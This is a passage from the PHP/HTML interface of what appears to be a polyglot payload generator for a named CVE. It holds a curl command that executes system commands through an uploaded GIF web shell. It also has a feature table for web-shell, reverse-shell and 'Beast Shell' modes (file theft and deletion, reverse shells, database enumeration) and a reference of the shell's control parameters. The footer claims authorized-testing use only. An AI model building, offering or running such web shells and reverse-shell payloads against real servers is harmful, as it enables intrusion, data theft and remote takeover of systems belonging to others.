                <button class="copy-btn" onclick="copyText('curl \"http://target/uploads/payload.gif?t=<?= $qs_token ?>&c=id\"')">📋</button>
            </div>
        </div>
    </div>

    <!-- Features Comparison -->
    <div class="card">
        <div class="card-header">
            <span class="icon green">⚡</span>
            Features by Mode
        </div>
        <div style="overflow-x:auto">
            <table class="feature-table">
                <thead>
                    <tr>
                        <th>Feature</th>
                        <th style="text-align:center">Web Shell</th>
                        <th style="text-align:center">Reverse Shell</th>
                        <th style="text-align:center">Beast Shell</th>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                        <td>Command Execution</td>
                        <td class="check" style="text-align:center">✅ 8 methods</td>
                        <td class="check" style="text-align:center">✅ 4 methods</td>
                        <td class="check" style="text-align:center">✅ 4 methods</td>
                    </tr>
                    <tr>
                        <td>File Upload</td>
                        <td class="check" style="text-align:center">✅</td>
                        <td class="cross" style="text-align:center">—</td>
                        <td class="check" style="text-align:center">✅</td>
                    </tr>
                    <tr>
                        <td>File Download</td>
                        <td class="check" style="text-align:center">✅</td>
                        <td class="cross" style="text-align:center">—</td>
                        <td class="cross" style="text-align:center">—</td>
                    </tr>
                    <tr>
                        <td>File Read (cat)</td>
                        <td class="check" style="text-align:center">✅</td>
                        <td class="cross" style="text-align:center">—</td>
                        <td class="check" style="text-align:center">✅</td>
                    </tr>
                    <tr>
                        <td>Delete File/Dir</td>
                        <td class="check" style="text-align:center">✅</td>
                        <td class="cross" style="text-align:center">—</td>
                        <td class="check" style="text-align:center">✅</td>
                    </tr>
                    <tr>
                        <td>Interactive Reverse Shell</td>
                        <td class="cross" style="text-align:center">—</td>
                        <td class="check" style="text-align:center">✅ 3 socket methods</td>
                        <td class="check" style="text-align:center">✅ fsockopen</td>
                    </tr>
                    <tr>
                        <td>DB Enum (MySQL/PgSQL/SQLite)</td>
                        <td class="cross" style="text-align:center">—</td>
                        <td class="cross" style="text-align:center">—</td>
                        <td class="check" style="text-align:center">✅</td>
                    </tr>
                    <tr>
                        <td>System Info JSON</td>
                        <td class="cross" style="text-align:center">—</td>
                        <td class="cross" style="text-align:center">—</td>
                        <td class="check" style="text-align:center">✅</td>
                    </tr>
                    <tr>
                        <td>AJAX Command Execution</td>
                        <td class="check" style="text-align:center">✅</td>
                        <td class="cross" style="text-align:center">—</td>
                        <td class="cross" style="text-align:center">—</td>
                    </tr>
                    <tr>
                        <td>File Manager UI</td>
                        <td class="check" style="text-align:center">✅</td>
                        <td class="cross" style="text-align:center">—</td>
                        <td class="check" style="text-align:center">✅</td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>

    <!-- All Parameters Reference -->
    <div class="card">
        <div class="card-header">
            <span class="icon blue">📋</span>
            Parameter Reference
        </div>
        <div style="overflow-x:auto">
            <table class="feature-table">
                <thead>
                    <tr>
                        <th>Parameter</th>
                        <th>Description</th>
                        <th>Modes</th>
                    </tr>
                </thead>
                <tbody>
                    <tr><td><code>t</code></td><td>Authentication token</td><td>All</td></tr>
                    <tr><td><code>c</code></td><td>Execute a system command</td><td>Shell, Beast</td></tr>
                    <tr><td><code>f</code> (POST)</td><td>Upload a file via multipart form</td><td>Shell, Beast</td></tr>
                    <tr><td><code>del</code></td><td>Delete a file or directory</td><td>Shell, Beast</td></tr>
                    <tr><td><code>dl</code></td><td>Download a file from server</td><td>Shell</td></tr>
                    <tr><td><code>cat</code></td><td>Display file contents in browser</td><td>Shell, Beast</td></tr>
                    <tr><td><code>rev</code>, <code>p</code></td><td>Trigger reverse shell to IP:PORT</td><td>Beast</td></tr>
                    <tr><td><code>db</code>, <code>host</code>, <code>user</code>, <code>pass</code>, <code>name</code>, <code>q</code></td><td>Database query</td><td>Beast</td></tr>
                    <tr><td><code>info</code></td><td>Return system information (JSON)</td><td>Beast</td></tr>
                </tbody>
            </table>
        </div>
    </div>

    <!-- Footer -->
    <footer class="footer">
        <p>CVE-2026-13001 Polyglot Payload Generator &mdash; For authorized security testing only</p>
        <p style="margin-top:4px">Generated <?= date('Y-m-d H:i:s') ?> &middot; PHP <?= phpversion() ?> &middot; Token: <span class="badge badge-gray"><?= htmlspecialchars($token) ?></span></p>
    </footer>

</div>

<!-- Toast -->
<div class="toast" id="toast">📋 Copied to clipboard!</div>

<script>
function copyUrl() {
    const el = document.getElementById('rawUrl') || document.getElementById('payloadUrl');
    const text = el.textContent.trim();
    copyText(text);
}

function copyText(text) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(() => showToast());
    } else {
        const ta = document.createElement('textarea');
        ta.value = text;
        ta.style.position = 'fixed';
        ta.style.left = '-9999px';
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        document.body.removeChild(ta);
        showToast();
    }
}

function showToast() {
    const t = document.getElementById('toast');
    t.classList.add('show');
    setTimeout(() => t.classList.remove('show'), 2000);
}

/* ── Live size update on config change ── */
document.querySelectorAll('input, select').forEach(el => {
    el.addEventListener('change', function() {
        // Form will submit natively, but we show feedback
    });
});
</script>

</body>
</html>
